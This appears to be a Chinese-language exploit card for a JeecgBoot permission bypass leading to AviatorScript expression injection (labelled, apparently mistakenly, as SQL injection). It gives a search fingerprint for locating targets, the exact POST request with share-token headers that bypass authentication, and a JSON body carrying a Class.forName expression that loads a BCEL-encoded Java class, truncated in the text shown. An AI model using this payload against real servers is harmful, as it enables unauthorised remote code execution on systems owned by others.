# JeecgBoot权限绕过致AviatorScript表达式注入漏洞

- **系统**：JeecgBoot　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="JeecgBoot 企业级低代码平台"`
- **请求**：`POST /jeecg-boot/jmreport/save?previousPage=1&jmLink=YWFhfHxiYm&shareToken=1&token=1 HTTP/1.1`
- **关键头**：`JmReport-Share-Token: 1`　`Content-Type: application/json;charset=UTF-8`

**请求体 / payload**
```
{"designerObj":{"id":"123456","name":"test","type":"datainfo"},"name":"sheet1","freeze":"A1","freezeLineColor":"rgb(185, 185, 185)","styles":[],"displayConfig":{},"printConfig":{"paper":"A4","width":210,"height":297,"definition":1,"isBackend":false,"marginX":10,"marginY":10,"layout":"portrait","printCallBackUrl":""},"merges":[],"rows":{"0":{"cells":{"0":{"text":"=(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dP$cbN$c2$40$U$3d$D$a5$c5Z$FD$7c$r$s$ea$c6$c2$c2n$dca$dc$YLL$88$Y$n$eeK$bd$nC$da$vi$H$82$7f$a5$h5$$$fc$A$3f$cax$db$u$Q$t$99$fb89$e7$be$be$be$3f$3e$B$9c$e3$c0F$JU$h5le$a6na$dbBC$c0$bc$9…（脚本共 1918 字，完整版见原文）
```
- **预期**：200　|　—